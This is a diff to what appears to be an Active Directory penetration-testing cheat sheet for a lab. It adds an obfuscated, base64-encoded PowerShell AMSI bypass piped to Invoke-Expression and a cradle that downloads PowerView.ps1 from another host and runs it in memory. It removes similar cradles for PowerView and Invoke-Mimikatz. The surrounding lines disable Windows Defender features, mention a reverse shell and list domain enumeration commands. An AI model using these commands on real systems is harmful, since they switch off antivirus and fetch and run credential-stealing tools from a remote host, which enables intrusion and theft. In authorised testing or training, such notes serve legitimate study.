@@ -67,10 +67,14 @@ Powershell Set-MpPreference -DisableIOAVProtection $true
 PowerShell set-MpPreference -DisableAutoExclusions $true
 ```
 ### Load Script in memory to bypass Windows Defender
+1. before that, you need to bypass the AMSI (AMSI is antivirus special in tracking the memory if there is a malicious code in the memory or not)
 ```
-iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
-iex (iwr http://172.16.100.7:9090/PowerView.ps1 -UseBasicParsing)
-iex (iwr http://172.16.100.7:9090/Invoke-Mimikatz.ps1 -UseBasicParsing)
+(neW-oBJeCt  iO.COMpRESsiOn.DeflAteSTrEAm([io.MemoryStREAM][coNveRT]::FrOmBAsE64StRINg( 'pZJRT9swEMff/SlOVqQmIqsyOjZENQnKpAkJWEUZe4jy4CaX1ZoTW7YzGqZ9dy5uBoWHvZAH53y+/8/3tx39kO3sED7DKWesc7L9CaveeWzmL2bTm671ssHpRevRarNC+1uW6OaMmW6tZAmlEs7BjvaHMaAv/6LURWO09TH/hbZFNTvkSRHWRpXzwtMPt0RtgeBLb+Er+qXV5VlVWXQuHrObK111ClPS2KExQyXXosFk/rbdLrWoLuXaCtvHI7p9C3attYI7aX0nFNnwWPp/FpQZPaXwfUxV9yv5QKY62Xqo1TXej5oUdOd3aWVq9U1V48LQ2F/GTxkj2Lvb3iBE4dgZi/a80JXmIV2cnOxb5KLhcADcyWmlFE9YNPa0L3h1A/vcFPhZ42RgrErRhmDR1TXaAWYIk7En0KtziJ7854MzKjlKIdt+yChhsS4iQ4il8OVm6GbRe8yLAuJsuzge6o4+DWOWhTHExyE+n5GM7u49qSb5/1/s9EpYtxGKmpsE0fD4J+fa9PFuZwKm8Nzox2TCJG7jHf8AgiRhjw==' ) , [SySteM.io.comPREssioN.CoMPReSSIONMOde]::DEcompreSS)| % { neW-oBJeCt io.sTreAMreaDER( $_ ,[TexT.eNcoDInG]::asCii)}).readtOeNd() |iEX
+
+```
+2. load the PowerShell code on the memory
+```
+iex(New-Object Net.WebClient).DownloadString('http://172.16.99.7:9090/PowerView.ps1')
 ```
 
 ### Reverse Shell using PowerShellTcp.ps1 & getting a shell using powercat in powershell
@@ -235,7 +239,7 @@ Get-DomainUser  #list all users
 Get-DomainUser | select samaccountname, memberof  #Get the list of usernames and their groups
 Get-DomainUser -Identity student1  OR Get-DomainUser -Username student1  #select the information only for student1
 Get-DomainUser | select samaccountname,logonCount  #Get specific property of all users
-Get-DomainUser -LDAPFilter "Description=*built*" | select name,Description
+Get-DomainUser -LDAPFilter "Description=*built*" | select name,Description OR Find-UserField -SearchField Description -SearchTerm "built"
 ```
 7. Get a list of computers in the current domain
 ```
